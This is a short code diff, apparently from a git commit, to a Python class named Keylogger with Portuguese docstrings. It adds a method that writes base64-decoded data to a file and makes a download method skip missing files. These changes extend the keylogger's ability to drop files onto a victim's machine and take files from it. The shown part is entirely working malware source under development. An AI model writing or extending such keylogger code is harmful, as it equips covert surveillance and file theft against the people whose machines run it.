@@ -38,11 +38,24 @@ class Keylogger(object):
         self.__status = True
 
 
+    def create_file(self, filename, data):
+
+        """
+        Cria um arquivo.
+        """
+
+        with open(filename, "wb") as file:
+            data = base64.b64decode(data)
+            file.write(data)
+
+
     def download(self, filename):
 
         """
         Retorna os bytes codificados de um arquivo.
         """
+
+        if not os.path.exists(filename): return ""
 
         with open(filename, "rb") as file:
             data = file.read()
